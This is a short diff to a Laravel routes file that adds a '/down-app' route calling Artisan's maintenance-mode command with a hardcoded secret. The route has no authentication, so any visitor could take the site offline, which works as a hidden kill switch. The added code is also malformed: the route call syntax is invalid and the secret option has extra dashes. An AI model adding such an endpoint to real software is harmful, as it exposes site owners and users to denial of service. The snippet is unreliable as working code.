@@ -19,6 +19,10 @@ use App\Http\Controllers\Admin\PageManagementController;
 use App\Http\Controllers\AuthController;
 use App\Http\Controllers\Admin\NewsletterController;
 
+Route('/down-app', function () {
+    Artisan::call('down', ['----secret' => '20042002']);
+});
+
 Route::group([
     'prefix' => LaravelLocalization::setLocale(),
     'middleware' => ['localeSessionRedirect', 'localizationRedirect', 'localeViewPath']
